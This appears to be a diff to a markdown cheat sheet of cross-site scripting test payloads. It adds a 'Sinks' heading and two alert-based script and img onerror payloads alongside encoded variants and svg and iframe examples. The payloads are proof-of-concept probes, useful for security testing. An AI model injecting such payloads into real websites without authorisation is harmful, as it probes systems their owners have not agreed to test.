@@ -12,12 +12,15 @@
 - `%3cb%3eSTUFF%3c%2fb%3e`
 - `&#x3c;b&#x3e;STUFF&#x3c;&#x2f;b&#x3e;`
 
+# Sinks
 ## Tag XSS
 ### Script
 - `<script>print()</script>`
+- ``<script>alert`1`</script>``
 - `<SrCiPt>print()</SCriPT>`
 ### Img
 - `<img src="" onerror="print()" />`
+- ``<img src=1 onerror=alert`1`>``
 - `<svg onload="alert()" />`
 ### Iframe
 - `<iframe onload="alert()" />`
